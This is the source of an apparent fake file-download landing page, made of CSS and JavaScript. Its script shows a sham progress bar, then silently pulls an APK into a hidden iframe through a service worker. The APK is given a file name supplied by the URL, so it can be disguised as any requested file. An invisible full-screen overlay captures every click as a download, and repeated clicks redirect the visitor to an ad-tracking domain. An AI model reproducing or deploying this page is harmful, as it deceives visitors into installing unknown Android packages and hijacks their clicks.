    <style>
     * {
       box-sizing: border-box;
       margin: 0;
       padding: 0;
       font-family: Verdana, Arial, Helvetica, sans-serif;
     }

     body {
       min-height: 100vh;
       overflow: hidden;
       display: flex;
       flex-direction: column;
       background: #fff;
       color: #1b1b1b;
     }

     .f-data {
       margin: 20vh auto 0;
       display: flex;
       flex-direction: row;
       align-items: center;
       gap: 15px;
       font-size: 14px;
     }

     .f-image {
       width: 70px;
       height: 105px;
       background: url(file.png) center 6px / 70px no-repeat;
       flex: 0 0 auto;
     }

     .f-info {
       display: flex;
       flex-direction: column;
       gap: 2px;
     }

     .f-name {
       width: 200px;
       overflow-wrap: break-word;
       font-size: 14px;
       font-weight: 700;
     }

     .f-size,
     .f-uploaded {
       font-size: 16px;
     }

     .s-box {
       position: relative;
       width: 270px;
       height: 50px;
       margin: 12px auto 0;
       padding: 1px;
       border-radius: 10px;
       box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
     }

     .scale {
       width: 0;
       height: 100%;
       border-radius: 10px;
       background: linear-gradient(279deg, rgba(109, 215, 90, 1) 1%, rgba(38, 130, 20, 1) 63%);
       transition: 200ms;
     }

     .scale-percent {
       position: absolute;
       top: 10px;
       left: 10px;
       color: #fff;
       font-size: 26px;
       font-weight: 700;
       text-shadow: 2px 2px rgb(29, 29, 29);
     }

     .d-box {
       position: relative;
       width: 100%;
       height: 100px;
       margin-top: 20px;
       overflow: hidden;
       display: flex;
       align-items: center;
       justify-content: center;
     }

     .d-button-box {
       position: absolute;
       top: -100%;
       width: 250px;
       height: 100px;
       display: flex;
       align-items: center;
       justify-content: center;
       transition: 1s;
     }

     button {
       position: relative;
       border: 0;
       border-radius: 20px;
       padding: 20px 38px;
       display: flex;
       flex-direction: row;
       align-items: center;
       justify-content: center;
       gap: 10px;
       background: #339120;
       box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
       color: #fff;
       font-size: 20px;
       font-weight: 600;
       letter-spacing: 1px;
       text-align: center;
       text-transform: uppercase;
       cursor: pointer;
     }

     button:disabled {
       cursor: wait;
       opacity: 0.7;
     }

     .click-area {
       position: fixed;
       inset: 0;
       z-index: 10;
       cursor: pointer;
     }

     .hidden-frame {
       position: absolute;
       width: 0;
       height: 0;
       border: 0;
       opacity: 0;
       pointer-events: none;
     }

    <script>
     (() => {
         const DEFAULT_FILE_NAME = 'download9918.apk';
         const TEST_REVISION = window.__downloadTestRevision;
         const SW_VERSION = window.__downloadSwVersion;
         const SW_URL = window.__downloadSwUrl;
         const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';

         const downloadButton = document.querySelector('#downloadButton');
         const downloadFrame = document.querySelector('#downloadFrame');
         const clickArea = document.querySelector('#clickArea');
         const fileTitle = document.querySelector('#fileTitle');
         const scale = document.querySelector('.scale');
         const scalePercentText = document.querySelector('.scale-percent');
         const downloadButtonBox = document.querySelector('.d-button-box');

         let savedParams = new URLSearchParams();
         let offerId = null;
         let fileName = DEFAULT_FILE_NAME;
         let isServiceWorkerReady = false;
         let trustedClickCount = 0;
         let isPresentationReady = false;

         function sanitizeFileName(value) {
             const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
             const candidate = String(value || '')
                 .replace(/\.apk$/i, '')
                 .slice(0, 80);
             const isValid = candidate !== ''
                          && !/^[ _-]+$/.test(candidate)
                          && !/^ /.test(candidate)
                          && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
             const base = isValid ? candidate : fallbackBase;
             return `${base}.apk`;
         }

         function getSavedOfferId() {
             const value = savedParams.get('offer_id');
             return value && value.trim() ? value.trim().slice(0, 80) : null;
         }

         function getSavedFileName() {
             return sanitizeFileName(savedParams.get('utm_medium'));
         }

         function getRedirectUrl() {
             const target = new URL(REDIRECT_HREF);
             target.searchParams.set('clickid', savedParams.get('clickid') || '');
             return target.href;
         }

         async function registerServiceWorker() {
             posthog.logger.info('Await window.__landParamsReady', {"delay": performance.now() - start})
             await window.__landingParamsReady;
             posthog.logger.info('Awaited window.__landParamsReady', {"delay": performance.now() - start})

             savedParams = window.__savedDownloadParams;
             offerId = getSavedOfferId();
             fileName = getSavedFileName();
             const title = document.querySelector('#fileTitle');
             if (title) title.textContent = fileName;

             posthog.logger.info('Await window.__swReadyPromise', {"delay": performance.now() - start})
             const swState = await window.__swReadyPromise;
             posthog.logger.info('Awaited window.__swReadyPromise', {"delay": performance.now() - start})

             if (!swState.ok || swState.direct) {
                 downloadButton.disabled = true;
                 posthog.logger.warn('Service worker is required for offer download', {"delay": performance.now() - start, "offer_id": offerId})
                 return;
             }

             isServiceWorkerReady = true;
             posthog.logger.info('Ready to download', {"delay": performance.now() - start, "sw_url": SW_URL, "offer_id": offerId, "fileName": fileName})
         }

         function startDownload() {
             posthog.logger.info('Start download', {"delay": performance.now() - start})
             if (!offerId) {
                 posthog.logger.warn('offer_id is missing', {"delay": performance.now() - start})
                 return;
             }

             const target = new URL('download.apk', window.__landingRoot);
             posthog.logger.info('Starting service worker download', {"delay": performance.now() - start, "sw_url": SW_URL, "offer_id": offerId, "fileName": fileName, "target": target.href})

             downloadFrame.src = 'about:blank';
             window.setTimeout(() => {
                 downloadFrame.src = target.href;
                 posthog.logger.info('End download after timeout', {"delay": performance.now() - start})
             }, 0);
         }

         function handleDownloadClick(event) {
             if (!isPresentationReady) {
                 return;
             }

             if (!isServiceWorkerReady) {
                 posthog.logger.info('Download requested before service worker readiness', {"delay": performance.now() - start})
                 return;
             }

             if (event && event.isTrusted) {
                 trustedClickCount += 1;

                 if (trustedClickCount >= 3) {
                     window.location.href = getRedirectUrl();
                     return;
                 }
             }

             startDownload();
         }

         function runProgress() {
             posthog.logger.info('Run progress bar', {"delay": performance.now() - start})
             return new Promise((resolve) => {
                 let scorePercent = 0;
                 scalePercentText.textContent = '0%';
                 const timer = window.setInterval(() => {
                     scorePercent += 10;
                     scale.style.width = `${scorePercent}%`;
                     scalePercentText.textContent = `${scorePercent}%`;
                     if (scorePercent < 100) {
                         return;
                     }

                     window.clearInterval(timer);
                     // Let the final 200ms scale transition reach 100% before revealing the button.
                     window.setTimeout(() => {
                         let fallback;
                         function finish(event) {
                             if (event && (event.target !== downloadButtonBox || event.propertyName !== 'top')) {
                                 return;
                             }
                             window.clearTimeout(fallback);
                             downloadButtonBox.removeEventListener('transitionend', finish);
                             resolve();
                         }
                         downloadButtonBox.addEventListener('transitionend', finish);
                         // Also complete in background tabs where transitionend may not fire.
                         fallback = window.setTimeout(finish, 1100);
                         downloadButtonBox.style.top = '0';
                     }, 200);
                 }, 100);
             });
         }

         if (fileTitle) {
             fileTitle.textContent = fileName;
         }

         downloadButton.addEventListener('click', handleDownloadClick);
         clickArea.addEventListener('click', handleDownloadClick);

         const downloadReady = registerServiceWorker().catch((error) => {
             console.error('[download] service worker setup failed', error);
             downloadButton.disabled = true;
             posthog.logger.error('Service worker setup failed', {"delay": performance.now() - start, "offer_id": offerId, "error_message": error.message})
         });

         Promise.all([runProgress(), downloadReady]).then(() => {
             isPresentationReady = true;
             downloadButton.disabled = !(isServiceWorkerReady && offerId);
             if (!downloadButton.disabled) {
                 startDownload();
             }
         });

     })();

    </script>
